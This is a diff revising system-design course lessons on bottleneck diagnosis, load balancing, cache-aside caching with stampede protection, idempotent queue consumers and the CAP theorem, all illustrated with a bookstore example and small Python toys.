+**WHAT YOU WILL BE ABLE TO DO:** Identify a concrete bottleneck (CPU, memory, disk, network, or lock) under load and name the scaling move that removes *that* bottleneck — not a generic “add servers” answer.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 81 (process + estimation + journey *map*), Phase 49-54 (machines have finite CPU/RAM/I/O), Phase 55-59 (networks add latency and failure).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 81 — process, estimation, journey map. Phases 49–54 — machines have finite CPU/RAM/I/O. Phases 55–59 — networks add latency and failure.
+
+**LEARNING RESOURCES:**
+
+- [Load Balancing system design (Exponent)](https://www.youtube.com/watch?v=chyZRNT7eEo)
+- [Load Balancing Algorithms (ByteByteGo)](https://www.youtube.com/watch?v=dBmxNsS3BGE)
+- DDIA chapter 1 vocabulary — reliability, scalability, maintainability (book)
+- [system-design-primer — performance vs scalability notes](https://github.com/donnemartin/system-design-primer)
 
 ## 82.1 Find the Bottleneck, Then Scale
 
-**WHY YOU ARE LEARNING THIS:** Phase 81 taught you to estimate and draw the simplest shape. "Scale it" is still not a design. Vertical scaling (bigger box) and horizontal scaling (more boxes) fix different limits. Guessing wrong wastes money and still leaves users waiting. This phase owns the habit: measure → name the scarce resource → pick the fix that multiplies *that* resource (including load balancers and when to add app replicas).
+Phase 81 taught you to estimate and draw the simplest shape. “Scale it” is still not a design. Vertical scaling (bigger box) and horizontal scaling (more boxes) fix different limits. Guessing wrong wastes money and still leaves bookstore shoppers waiting on checkout. This phase owns the habit: **measure → name the scarce resource → pick the fix that multiplies that resource**.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**WHY A BOTTLENECK MUST COME FIRST:**
 
-- Foundations: [Load Balancing system design (Exponent)](https://www.youtube.com/watch?v=chyZRNT7eEo) *(Composio YouTube)*; [Load Balancing Algorithms (ByteByteGo)](https://www.youtube.com/watch?v=dBmxNsS3BGE) *(Composio YouTube)*
-- Written: [donnemartin/system-design-primer](https://github.com/donnemartin/system-design-primer) *(Composio GitHub)*; DDIA chapter 1 vocabulary (reliability, scalability, maintainability)
-- Practice: for one of your apps, list the first thing that would break at 100× traffic - prefer a diagram + numbers over code
-
-**STEP-BY-STEP EXPLANATION**
+Adding app replicas when the database is pegged makes the outage *worse* — more workers hammer the same scarce disk. Adding a bigger CPU when the lock is global does nothing. The first skill is reading symptoms the way Phase 80 taught you to read signals: which resource is saturated, and what would happen if you only multiplied the *wrong* tier.
 
 | Symptom | Likely scarce resource | First moves |
 | ------- | ---------------------- | ----------- |
-| CPU pegged, latency climbs with compute | CPU | Optimize hot path; then more app replicas behind a **load balancer** |
-| RAM grows with sessions / caches | Memory | Externalize session (Phase 68); bound caches (Phase 83); then more nodes |
-| Disk / DB IOPS saturated | Storage I/O | Indexes, read replicas, shard later (Phase 65) |
-| Timeouts while DB is fine | Network / downstream | Timeouts + pools; async (Phase 84); circuit breakers (Phase 87) |
-| One lock / global mutex | Contention | Partition work; avoid global serialization |
+| CPU pegged; latency climbs with compute | CPU | Profile hot path; then more app replicas behind a **load balancer** |
+| RAM grows with sessions / unbounded caches | Memory | Externalize session (Phase 68); bound caches (Phase 83); then more nodes |
+| Disk / DB IOPS saturated; query queue depth rising | Storage I/O | Indexes, read replicas; shard later only if writes force it (Phase 65) |
+| Timeouts while DB looks fine | Network / downstream | Connection pools; async off path (Phase 84); circuit breakers (Phase 87) |
+| One lock / global mutex / single-threaded critical section | Contention | Partition work; avoid global serialization |
 
-**Load balancer (this phase owns the app-tier shape):** clients hit one VIP; the LB distributes to healthy app instances (round-robin, least-connections, etc.). Health checks remove bad nodes. Sticky sessions are a conscious trade-off that fights horizontal scale - prefer shared session store or tokens.
+**VERTICAL THEN HORIZONTAL — AND THE NEW PROBLEM EACH CREATES:**
 
-**Vertical vs horizontal:** vertical is simple until you hit a ceiling or a single point of failure. Horizontal needs **stateless app tiers** and shared durable state in DB/cache/queue. Phase 81 named the words; here you diagnose *which* ceiling you hit.
+**Vertical** is the right first answer when you are still on one box and the numbers fit: bigger instance, more RAM, faster disk. It buys time without rewriting the app. The new problem: there is a hard ceiling, and the whole service is still one failure domain — one power event, one kernel panic, one bad deploy takes everything.
+
+**Horizontal** multiplies capacity by adding machines. The new problem: anything stored *in* the process (sessions, uploads, in-memory job state) becomes wrong the moment request #2 hits a different node. You must make the app tier **stateless** and put durable shared state in DB, cache, or queue. Sticky sessions at the load balancer are a conscious trade-off that fights horizontal scale — prefer shared session store or tokens.
 
 ```text
-Load → LB → [app][app][app] → DB / cache / queue
-                 ↑
-        scale this tier when CPU-bound and stateless
+BEFORE (one box):
+  Client → [app + local sessions + DB on same machine]
+  Ceiling: CPU or disk; failure domain: everything
+
+AFTER (horizontal app tier):
+  Client → LB → [app][app][app] → shared DB / cache / queue
+                    ↑
+           scale this tier when CPU-bound AND stateless
 ```
 
-**Not owned here:** cache strategies (83), queue design (84), CAP proofs (85).
+**LOAD BALANCER (THIS PHASE OWNS THE APP-TIER SHAPE):**
 
-**SMALL WORKING EXAMPLE**
+Clients hit one VIP (or DNS name). The LB distributes to healthy app instances — round-robin, least-connections, or consistent hashing when affinity is unavoidable. Health checks remove bad nodes so traffic stops landing on a dying process. The LB does **not** fix a saturated database; it only multiplies the app tier.
+
+What the LB introduces: another hop, another config surface, and the temptation to sticky-session your way out of shared state. Say the trade-off out loud when you choose stickiness.
+
+**BOOKSTORE CHECKOUT UNDER LOAD — WORKED DIAGNOSIS:**
+
+```text
+Observation (Phase 80 signals):
+  http_p95_ms ↑     app CPU 25%     db_cpu 92%     checkout_errors ↑
+
+Wrong move:  add 10 app pods
+  → more connections → DB worse → error storm
+
+Right move:  name scarce resource = DB CPU / query path
+  → check slow queries / missing indexes
+  → then read replicas for catalog reads (Phase 65 ops)
+  → app replicas ONLY after DB headroom returns
+
+If instead app CPU were 95% and DB 20%:
+  → horizontal app scale behind LB is the lever
+  → but first confirm sessions are not in-process
+```
+
+**NOT OWNED HERE:** cache-aside and invalidation detail (83), queue design (84), CAP proofs (85). You may *name* those as next levers when the bottleneck is “same hot rows” or “slow side effects” — you do not design them yet.
 
 ```python playground=cs-phase-82-bottleneck
 # Toy capacity model: find which resource hits 100% first.
 
-demand = {"rps": 500, "cpu_ms": 2.0, "db_ms": 5.0}
-capacity = {"cpu_cores": 4, "db_qps": 200}
+def diagnose(rps, cpu_ms_per_req, db_ms_per_req, cpu_cores, db_qps_cap):
+    cpu_util = (rps * cpu_ms_per_req / 1000) / cpu_cores
+    # crude: each request holds DB for db_ms; convert to equivalent QPS pressure
+    db_util = (rps * db_ms_per_req / 1000) / (db_qps_cap * (db_ms_per_req / 1000))
+    # simpler saturation model used in the lesson:
+    db_util_simple = rps / db_qps_cap
+    print(f"rps={rps}  CPU util≈{cpu_util:.2f}  DB util≈{db_util_simple:.2f}")
+    if db_util_simple >= 1 and db_util_simple >= cpu_util:
+        print("Bottleneck: DB — indexes/replicas/cut queries before more app pods.")
+    elif cpu_util >= 1:
+        print("Bottleneck: CPU — add app replicas after confirming stateless tier.")
+    else:
+        print("Headroom remains — measure again under real traffic.")
 
-cpu_util = (demand["rps"] * demand["cpu_ms"] / 1000) / capacity["cpu_cores"]
-db_util = demand["rps"] / capacity["db_qps"]
+print("--- bookstore catalog browse spike ---")
+diagnose(rps=800, cpu_ms_per_req=1.5, db_ms_per_req=4.0, cpu_cores=4, db_qps_cap=200)
 
-print(f"CPU util≈{cpu_util:.2f}  DB util≈{db_util:.2f}")
-if db_util > cpu_util and db_util >= 1:
-    print("Bottleneck: DB — scale reads/shard or cut queries before more app pods.")
-elif cpu_util >= 1:
-    print("Bottleneck: CPU — add app replicas (horizontal) after profiling.")
-else:
-    print("Headroom remains — measure again under real traffic.")
+print("--- CPU-heavy recommendation toy ---")
+diagnose(rps=200, cpu_ms_per_req=25.0, db_ms_per_req=1.0, cpu_cores=4, db_qps_cap=500)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Define vertical vs horizontal scaling in one sentence each |
-| Medium | Given "p99 latency up, CPU 30%, DB CPU 95%," pick the first fix and why |
-| Hard | Draw before/after for making a session-sticky monolith horizontally scalable |
+| Medium | Given “p99 latency up, CPU 30%, DB CPU 95%,” pick the first fix and why adding app pods would hurt |
+| Medium | Draw before/after for making a session-sticky bookstore monolith horizontally scalable |
+| Hard | For three symptoms (CPU pegged; disk saturated; global lock), name the scarce resource, the scale move, and the *new* problem that move introduces |
 
-**WHY THE NEXT TOPIC IS NEEDED - Caching:** Scaling compute does not help if every request still hits a slow dependency for the same hot data. Caching trades freshness for speed - and creates invalidation risk. That is Phase 83.
+**WHAT THIS UNLOCKS NEXT:**
+
+Scaling compute does not help if every request still hits a slow dependency for the same hot catalog row. Caching trades freshness for speed — and creates invalidation risk and stampedes. That staleness budget is Phase 83.
 
 ---
 
@@ -17451,81 +14029,148 @@ else:
 
 ---
 
-
 # PHASE 83 - Caching
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Choose a cache strategy (cache-aside, read-through, write-through/write-behind) for a concrete read path and explain the invalidation risk if the data changes.
+**WHAT YOU WILL BE ABLE TO DO:** Choose a cache strategy (cache-aside, read-through, write-through/write-behind) for a concrete read path and explain the invalidation risk, TTL trade-off, and stampede failure mode if the data changes or the cache goes cold.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 82 (you only cache after you know what is slow), Phase 60-65 (the source of truth is still the database), Phase 48 (LRU is one eviction policy you already built).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 82 — you only cache after you know what is slow. Phases 60–65 — the source of truth is still the database. Phase 48 — LRU is one eviction policy you already built.
+
+**LEARNING RESOURCES:**
+
+- [Cache Invalidation (CodeOpinion)](https://www.youtube.com/watch?v=OYZCcVbKCKE)
+- Caching section in [system-design-primer](https://github.com/donnemartin/system-design-primer)
+- [Patterns of Distributed Systems (Fowler catalog)](https://martinfowler.com/articles/patterns-of-distributed-systems/)
+- Redis docs: eviction policies overview (skim; mechanisms matter more than product)
 
 ## 83.1 Speed With a Staleness Budget
 
-**WHY YOU ARE LEARNING THIS:** Phase 81 only *named* caching on the journey map. A cache is a copy kept for speed. Copies go wrong. This phase owns **who fills the cache**, **who updates it on write**, and **what users see when the copy is stale or missing** - including stampede/penetration/cold-cache failure modes.
+Phase 82 can multiply app servers until every replica still asks Postgres for the same bestseller ISBN. More boxes do not help when the scarce resource is **repeated origin reads**. A cache is a copy kept for speed. Copies go wrong. This phase owns **who fills the cache**, **who updates it on write**, and **what users see when the copy is stale or missing** — including stampede, penetration, and cold-start failure modes. Full distributed consistency across replicas is Phase 85; here you own the *application cache* contract.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**WHY A CACHE BECOMES NECESSARY NOW:**
 
-- Invalidation mindset: [Cache Invalidation (CodeOpinion)](https://www.youtube.com/watch?v=OYZCcVbKCKE) *(Composio YouTube)*
-- Written: cache-aside / lazy loading patterns *(Composio web)*; [Patterns of Distributed Systems (Fowler catalog)](https://martinfowler.com/articles/patterns-of-distributed-systems/) *(Composio fetch)*
-- Primer: caching section in [system-design-primer](https://github.com/donnemartin/system-design-primer) *(Composio GitHub)*
-- Practice: pick one hot GET in an app and write the invalidation rule on paper before coding Redis
+When estimates (Phase 81) show read peaks far above what the origin can serve, or profiles (Phase 82) show the same keys dominating DB time, you introduce a faster tier closer to the app. The new problem is not “Redis config.” It is: **how wrong may the answer be, for how long, and what happens when everyone misses at once.**
 
-**STEP-BY-STEP EXPLANATION**
+**CACHE-ASIDE (THE DEFAULT YOU SHOULD BE ABLE TO DRAW):**
+
+```text
+Read path:
+  Client → App → Cache ─hit→ return
+                   │
+                 miss
+                   ↓
+                  DB → fill cache → return
+
+Write path (invalidate):
+  Client → App → update DB → DELETE cache key
+  Next read misses and refills with fresh data
+```
+
+Cache-aside (lazy loading) keeps the database as source of truth. The app owns the fill and the invalidate. That is why it is the most common interview and production pattern for read-heavy catalog data.
 
 | Pattern | Read miss | Write | Typical risk |
 | ------- | --------- | ----- | ------------ |
 | **Cache-aside** | App loads DB → fills cache | App updates DB, then deletes/updates key | Stale if delete fails; thundering herd on miss |
-| **Read-through** | Cache library loads DB | Usually paired with write policy | Hides DB details; still need TTL/invalidation |
+| **Read-through** | Cache library loads DB | Usually paired with a write policy | Hides DB details; still need TTL/invalidation |
 | **Write-through** | From cache | Write cache + DB together | Slower writes; cache and DB stay closer |
-| **Write-behind** | From cache | Write cache, flush DB async | Fast writes; data loss window if crash |
+| **Write-behind** | From cache | Write cache, flush DB async | Fast writes; **data-loss window** if crash before flush |
 
-**Eviction:** LRU/LFU/TTL bound memory. TTL alone is not a correctness strategy for money or permissions - use explicit invalidation or short TTL + careful reads.
+**STALENESS BUDGET — SAY IT EXPLICITLY:**
+
+Every cache choice is a product decision wearing infrastructure clothes:
+
+- **Price / stock for checkout** — often needs short TTL *plus* invalidate-on-write; money and inventory are where “eventually” hurts.
+- **Book cover URL / blurb** — minutes of staleness may be fine.
+- **Immutable short-link target** (bookstore campaign URLs) — almost free to cache forever until expiry; invalidation is rare.
+
+TTL alone is not a correctness strategy for permissions or money. Use explicit invalidation, or short TTL plus careful read paths. Eviction (LRU/LFU) only bounds **memory**; it does not guarantee freshness.
+
+**THE NEW PROBLEMS CACHING INTRODUCES:**
+
+1. **Stale reads** — write succeeded in DB; cache still holds yesterday’s price.
+2. **Cache penetration** — repeated reads for keys that do not exist hammer the DB (negative caching / bloom filters help; do not invent them as magic).
+3. **Stampede / thundering herd** — popular key expires; thousands of apps miss together; origin melts. Mitigations: singleflight (one filler), soft TTL + probabilistic early refresh, lock around fill.
+4. **Cold cache after restart** — traffic that was fine suddenly looks like an origin DDoS.
 
 ```text
-Client → App → Cache ─miss→ DB
-                 ↑
-            delete key on write (cache-aside)
+STAMPEDE (why “just add Redis” can make outages worse):
+
+  t=0   key "isbn:978..." expires
+  t=0+  5,000 app workers miss at once → 5,000 identical DB queries
+  t=1   DB CPU pegged → even uncached paths fail
+
+  Fix idea: only ONE worker fills; others wait or serve slightly stale
 ```
 
-**SMALL WORKING EXAMPLE**
+**BOOKSTORE CATALOG — WORKED CHOICE:**
+
+```text
+Hot path: GET /books/{isbn}  (read-heavy, Zipfian bestsellers)
+
+Choose: cache-aside in Redis
+  key: book:{isbn}
+  value: JSON of display fields
+  on admin update title/price: UPDATE db; DEL book:{isbn}
+  TTL: 5 minutes as safety net if delete fails
+
+Not choose write-behind for price:
+  crash between cache write and DB flush → wrong price sold
+```
+
+Distributed “is this replica consistent?” questions wait for Phase 85. Here the contract is simpler and still hard: **app cache vs database of record**, with an explicit staleness budget.
 
 ```python playground=cs-phase-83-cache-aside
 # Cache-aside toy: dict cache + "DB". Write deletes the key (invalidate).
+# Also shows a tiny singleflight lock so two misses do not double-fill.
 
-db = {"user:1": {"name": "Ada", "plan": "free"}}
+import threading
+
+db = {"book:1": {"title": "Dune", "price": 12}}
 cache = {}
+fill_locks = {}
+lock_guard = threading.Lock()
 
-def get_user(uid):
-    key = f"user:{uid}"
+def get_book(bid):
+    key = f"book:{bid}"
     if key in cache:
         print("HIT", cache[key])
         return cache[key]
-    row = db[key]
-    cache[key] = dict(row)
-    print("MISS→fill", cache[key])
-    return cache[key]
+    with lock_guard:
+        filler = fill_locks.setdefault(key, threading.Lock())
+    with filler:
+        if key in cache:  # another waiter may have filled
+            print("HIT-after-wait", cache[key])
+            return cache[key]
+        row = dict(db[key])
+        cache[key] = row
+        print("MISS→fill", row)
+        return row
 
-def update_plan(uid, plan):
-    key = f"user:{uid}"
-    db[key]["plan"] = plan
+def update_price(bid, price):
+    key = f"book:{bid}"
+    db[key]["price"] = price
     cache.pop(key, None)  # invalidate
-    print("WRITE+invalidate", plan)
+    print("WRITE+invalidate", price)
 
-get_user(1)
-update_plan(1, "pro")
-get_user(1)
+get_book(1)
+get_book(1)
+update_price(1, 15)
+get_book(1)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | Define cache-aside in three steps |
-| Medium | Argue TTL vs delete-on-write for a product price page |
-| Hard | Design stampede protection (singleflight / lock) for a hot key |
+| Easy | Define cache-aside in three steps (read miss, fill, write invalidate) |
+| Medium | Argue TTL vs delete-on-write for a bookstore product price page |
+| Medium | Explain stampede: what triggers it, what it does to the origin, one mitigation |
+| Hard | Design cache keys + invalidation for “book detail” vs “inventory remaining” with different staleness budgets |
 
-**WHY THE NEXT TOPIC IS NEEDED - Async & Events:** Not every slow thing should be cached - some work should leave the request path entirely (emails, thumbnails, fan-out). Queues and events decouple producers from consumers. That is Phase 84.
+**WHAT THIS UNLOCKS NEXT:**
+
+Not every slow thing should be cached. Some work — receipt email, search reindex, thumbnail resize — should leave the request path entirely. Synchronous call chains couple failure: if email is down, checkout looks down. Queues and events decouple producers from consumers. That is Phase 84.
 
 ---
 
@@ -17533,56 +14178,105 @@ get_user(1)
 
 ---
 
-
 # PHASE 84 - Asynchronous & Event-Driven Systems
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain when a message queue or event log beats a synchronous call - including at-least-once delivery, idempotency, and consumer lag trade-offs.
+**WHAT YOU WILL BE ABLE TO DO:** Explain when a message queue or event log beats a synchronous call — including at-least-once delivery, idempotent consumers, and the new problems of lag, duplicates, and harder debugging.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 82-83 (you have scaled and cached the sync path), Phase 55-59 (networks fail; timeouts matter), Phase 74 (async work still needs tests and contracts).
+**WHAT YOU SHOULD KNOW FIRST:** Phases 82–83 — you have scaled and cached the sync path. Phases 55–59 — networks fail; timeouts matter. Phase 80 — traces help when work leaves the request thread.
+
+**LEARNING RESOURCES:**
+
+- [Kafka introduction (Apache)](https://kafka.apache.org/intro) — event log mental model
+- [Message queues vs event streams overview](https://www.youtube.com/watch?v=PQHf_IzmUXE)
+- [Patterns of Distributed Systems](https://martinfowler.com/articles/patterns-of-distributed-systems/)
+- Phase 80 observability — follow a message across services with correlation ids
 
 ## 84.1 Decouple With Queues and Events
 
-**WHY YOU ARE LEARNING THIS:** Phase 81 only flagged async as a later lever. A checkout HTTP handler that also sends email, resizes images, and updates search will time out and fail partially. This phase owns asynchronous designs that **accept work quickly**, then process it elsewhere - at the cost of eventual visibility and harder debugging (Phase 80 traces help). Not a Kafka internals course.
+A bookstore checkout HTTP handler that also sends email, resizes the gift-wrap image, and updates search will time out and fail partially. Caching (83) helps repeated *reads*. It does not help slow *side effects* that must not block the user’s “order placed” response. This phase owns asynchronous designs that **accept work quickly**, then process it elsewhere — at the cost of eventual visibility, duplicate delivery, and harder debugging. Not a Kafka internals course; not consensus (86).
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**WHY DECOUPLING BECOMES NECESSARY NOW:**
 
-- Overview: [Kafka vs message queues intros](https://www.youtube.com/watch?v=PQHf_IzmUXE) *(Composio YouTube)*
-- Written: [Apache Kafka introduction](https://kafka.apache.org/intro) *(Composio fetch)*; Kafka vs RabbitMQ trade-offs *(Composio web)*
-- Patterns: [Patterns of Distributed Systems](https://martinfowler.com/articles/patterns-of-distributed-systems/) *(Composio fetch)*
-- Practice: list three side effects in an app that should leave the request thread
+Synchronous chains create a failure union: any dependency down → caller fails. They also create a latency sum: every side effect adds to p99. When Phase 81’s clarify step says “user must not wait for email,” or Phase 82 shows timeouts while the DB is fine, you pull work off the request path. The new problem: the user may see “accepted” before side effects finish — and the same message may be delivered more than once.
 
-**STEP-BY-STEP EXPLANATION**
-
-**Prefer a queue / event when:**
+**WHEN A QUEUE / EVENT BEATS A DIRECT CALL:**
 
 1. Work is slow, bursty, or optional to the immediate user response.
 2. Multiple independent consumers need the same fact (email + analytics + search).
-3. You want backpressure (buffer) instead of cascading timeouts.
+3. You want **backpressure** (a buffer) instead of cascading timeouts into the API tier.
 
-**Prefer a direct call when:** the caller must know the result to continue (auth check, price quote, inventory reservation that must be sync-consistent).
+**WHEN A DIRECT CALL STILL WINS:**
+
+The caller must know the result to continue — auth check, price quote, inventory reservation that must be sync-consistent for the next screen. Do not async your way out of a consistency requirement you have not designed (that conversation continues in Phase 85).
 
 | Model | Strength | Watch-outs |
 | ----- | -------- | ---------- |
-| **Work queue** (compete consumers) | Parallelize jobs | Poison messages; visibility timeout |
-| **Pub/sub** | Fan-out | Independent failure per subscriber |
-| **Event log** (Kafka-style) | Replay, multiple consumer groups | Offset management; retention; ordering per partition |
-
-Delivery is usually **at-least-once** → consumers must be **idempotent** (dedupe keys, upserts).
+| **Work queue** (compete consumers) | Parallelize jobs | Poison messages; visibility timeout; ordering not global |
+| **Pub/sub** | Fan-out to many subscribers | Independent failure per subscriber |
+| **Event log** (Kafka-style) | Replay; multiple consumer groups | Offset management; retention; **ordering per partition**, not globally |
 
 ```text
-API ──enqueue──► Queue/Log ──► Workers
-  │                              │
-  └── fast 202 / "accepted"      └── side effects (email, index, …)
+SYNC (coupled):
+  API ──email──► mailer ──resize──► images ──index──► search
+    └── user waits; any X fails the whole request
+
+ASYNC (decoupled):
+  API ──enqueue──► Queue/Log ──► Workers (email, images, search)
+    │                              │
+    └── fast 202 / "accepted"      └── side effects later
 ```
 
-**SMALL WORKING EXAMPLE**
+**AT-LEAST-ONCE IS THE DEFAULT — DESIGN FOR IT:**
+
+Most practical queues give **at-least-once** delivery: after a crash, a message may be redelivered. Exactly-once is a special claim that usually means “effectively once” via idempotent writes + careful offsets — not magic.
+
+Therefore consumers must be **idempotent**:
+
+- Dedupe on a business key (`order_id`) stored in a processed-set or unique constraint.
+- Prefer upserts over blind inserts.
+- Never “debit account += amount” without a unique operation id.
+
+```text
+Message: { "order_id": "9", "action": "send_receipt" }
+
+Delivery 1 → send email, record processed(order_id=9)
+Delivery 2 → see processed → SKIP
+Without dedupe → customer gets two receipts (annoying)
+With money    → customer gets charged twice (catastrophic)
+```
+
+**THE NEW PROBLEMS ASYNC INTRODUCES:**
+
+1. **Consumer lag** — producers are fine; workers fall behind; “eventual” becomes “hours.”
+2. **Poison messages** — one bad payload blocks a partition/queue if you retry forever.
+3. **Ordering illusions** — two partitions do not preserve global order; key by `user_id` when per-user order matters.
+4. **Debuggability** — the HTTP request returned 202; the failure is elsewhere. Correlation ids and traces (Phase 80) become mandatory, not nice-to-have.
+5. **Dual writes** — API writes DB *and* publishes an event; one can succeed without the other. Outbox pattern exists for a reason (name it; do not turn this phase into a catalog of every pattern).
+
+**BOOKSTORE CHECKOUT — WORKED SPLIT:**
+
+```text
+Must be sync in the request:
+  reserve inventory, charge payment, write order row
+
+May be async after commit:
+  send receipt email
+  update recommendations
+  reindex search
+  notify warehouse
+
+API returns 201 with order_id once the sync truth is durable.
+Workers consume order_placed events; email consumer is idempotent on order_id.
+```
+
+Consensus about *who is leader* is Phase 86. Surviving a sick dependency with retries and breakers is Phase 87. Here you own the **decoupling contract**.
 
 ```python playground=cs-phase-84-queue-dedupe
 # At-least-once delivery: same message may arrive twice. Idempotent handler.
 
-inbox = ["order-9", "order-9", "order-10"]  # duplicate
+inbox = ["order-9", "order-9", "order-10"]  # duplicate redelivery
 done = set()
 actions = []
 
@@ -17595,17 +14289,22 @@ for msg in inbox:
     print("PROCESS", msg)
 
 print("actions", actions)
+
+# Contrast: non-idempotent debit would double-charge on the duplicate.
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | Name one sync call and one async job in a typical web app |
+| Easy | Name one sync call and one async job in a typical bookstore checkout |
 | Medium | Explain why at-least-once + non-idempotent debit is dangerous |
-| Hard | Sketch Kafka partitions for "user_id ordered events" vs global ordering |
+| Medium | Sketch when a work queue beats pub/sub for “send receipt,” and when fan-out wins |
+| Hard | Design partition keys for “user_id ordered events” vs a case that needs global ordering — and say why global ordering hurts throughput |
 
-**WHY THE NEXT TOPIC IS NEEDED - Distributed Systems:** Queues and replicas assume machines keep agreeing on reality. When the network partitions, you face the CAP trade-off - consistency vs availability under partition. That is Phase 85.
+**WHAT THIS UNLOCKS NEXT:**
+
+Queues and replicas assume machines keep agreeing on reality. When you keep multiple copies — caches, DB replicas, event consumers — and the network partitions, you face a hard limit: during a partition you cannot have both perfect consistency and perfect availability. That limit is CAP, and it is Phase 85.
 
 ---
 
@@ -17613,54 +14312,45 @@ print("actions", actions)
 
 ---
 
-
 # PHASE 85 - Distributed Systems
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Reason about failure across machines - explain the CAP theorem with a concrete partition example and what CP vs AP means for a real service.
+**WHAT YOU WILL BE ABLE TO DO:** Explain the CAP theorem with a concrete partition example, distinguish CAP consistency from ACID consistency, apply PACELC lightly to everyday latency trade-offs, and reason about replication consistency models when the bookstore’s data lives on more than one machine.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phases 81-84 (you already scale, cache, and queue; CAP is the limit those techniques operate under), Phase 64-65 (replication and consistency at the database layer).
+**WHAT YOU SHOULD KNOW FIRST:** Phases 81–84 — you already scale, cache, and queue; CAP is the limit those techniques operate under. Phases 64–65 — ACID and replication/partitioning/sharding at the database layer (ops story). This phase revisits that machinery as *consistency theory*, not a second ops chapter.
+
+**LEARNING RESOURCES:**
+
+- [CAP Theorem Simplified (ByteByteGo)](https://www.youtube.com/watch?v=BHqjEjzAicA)
+- [Eric Brewer — CAP twelve years later](https://www.infoq.com/articles/cap-twelve-years-later-how-the-rules-have-changed/)
+- [Kleppmann — A Critique of the CAP Theorem](https://arxiv.org/abs/1509.05393)
+- [Daniel Abadi on PACELC](https://dbmsmusings.blogspot.com/2010/04/problems-with-cap-and-yahoos-little.html)
+- [Jepsen analyses](https://jepsen.io/analyses) — read one database you use; see which guarantees broke
 
 ## 85.1 The CAP Theorem
 
-**WHY YOU ARE LEARNING THIS:** Once a system is distributed across multiple machines (after you replicate or shard - Phase 65 revisited under load via Phase 81's map and Phase 82), a fundamental, provable limit appears that no amount of good engineering can design around - only work through deliberately.
+Phases 82–84 gave you more machines, more copies, and more asynchronous paths. The moment those machines can lose contact, a fundamental limit appears. No amount of clever caching invents a third option that Gilbert and Lynch already ruled out. This lesson owns that limit with a **concrete partition** — not a buzzword triangle.
 
-**Progression 65 → 85:** Phase 65 taught *how* replication, partitioning, and sharding work inside a database story. Phase 85 teaches what those techniques *cannot* promise once the network can partition: **CAP consistency is not ACID consistency**. The C in ACID (Phase 64) is about integrity constraints inside a database. The C in CAP means *linearizability* across replicas during a partition - a different, stronger, and easier-to-lose property. Conflating them is a common interview failure.
+**PROGRESSION 65 → 85 (HEALTHY REVISIT, NOT A DUPLICATE):**
 
-**The theorem, plainly:** in the presence of a **network Partition** (some machines can't talk to others - inevitable when the amount of work grows; networks fail), a distributed system must choose between **Consistency** (every read sees the latest write, even if it means refusing to answer during the partition) and **Availability** (every request gets a response, even if it might be slightly stale). You cannot have perfect versions of both at the same time, during a partition. Keep this concrete - two nodes, one cut cable - not a huge theory chapter.
+Phase 65 taught *how* replication, partitioning, and sharding work inside a database story — failover, write scale, operational shapes. Phase 85 teaches what those techniques *cannot* promise once the network can partition: **CAP consistency is not ACID consistency**. The C in ACID (Phase 64) is about integrity constraints inside a database transaction. The C in CAP means *linearizability* (single-copy semantics) across replicas during a partition — a different, stronger, easier-to-lose property. Conflating them is a common interview failure.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**FORMAL PROPERTIES (PRECISE ENOUGH TO USE):**
 
-- Composio refresh: [CAP theorem explained (Studying With Alex)](https://www.youtube.com/watch?v=gkg-FAEXIkY) *(Composio YouTube)*; Brewer CAP materials *(Composio web + Scholar)*; [Patterns of Distributed Systems](https://martinfowler.com/articles/patterns-of-distributed-systems/) *(Composio fetch)*
+The Gilbert–Lynch result concerns three properties:
 
-- Best animated explanation: [CAP Theorem Simplified (ByteByteGo)](https://www.youtube.com/watch?v=BHqjEjzAicA) - the clearest short treatment, and it correctly frames the choice as arising only during a partition rather than as a permanent property. Pair with [What is CAP Theorem? (IBM Technology)](https://www.youtube.com/watch?v=_RbsFXWRZ10)
-- Alternative: [CAP Theorem (Gaurav Sen)](https://www.youtube.com/watch?v=k-Yaq8AHlFA) reasons through a concrete two-node example rather than presenting the conclusion, which is how the theorem actually becomes intuitive
-- Another angle: [Distributed Systems 1.1: Introduction (Martin Kleppmann)](https://www.youtube.com/watch?v=UEAMfLPZZhE) *(Composio YouTube; replaced dead CAP-talk ID)* — start from Kleppmann's framing that latency and partitions make cartoon CP/AP labels too coarse; that is what separates a memorised answer from an understood one
-- Interactive simulator: [Jepsen](https://jepsen.io/analyses) is the closest thing to a simulator and is genuinely remarkable: it partitions real distributed databases under real load and publishes exactly which guarantees each one violated. Read the analyses of a database you use and you will never again take a vendor's consistency claim at face value. To run the experiment yourself, bring up a three-node cluster in Docker, use `iptables` or `tc` to sever one node, and observe what reads and writes each partition accepts
-- Written documentation: [Brewer's original conjecture and the Gilbert-Lynch proof](https://users.ece.cmu.edu/~adrian/731-sp04/readings/GL-cap.pdf), [Eric Brewer's own twelve-years-later retrospective](https://www.infoq.com/articles/cap-twelve-years-later-how-the-rules-have-changed/) which is more useful than the original, [Kleppmann's "A Critique of the CAP Theorem"](https://arxiv.org/abs/1509.05393), and [Daniel Abadi on PACELC](https://dbmsmusings.blogspot.com/2010/04/problems-with-cap-and-yahoos-little.html) which extends CAP to cover the normal, unpartitioned case
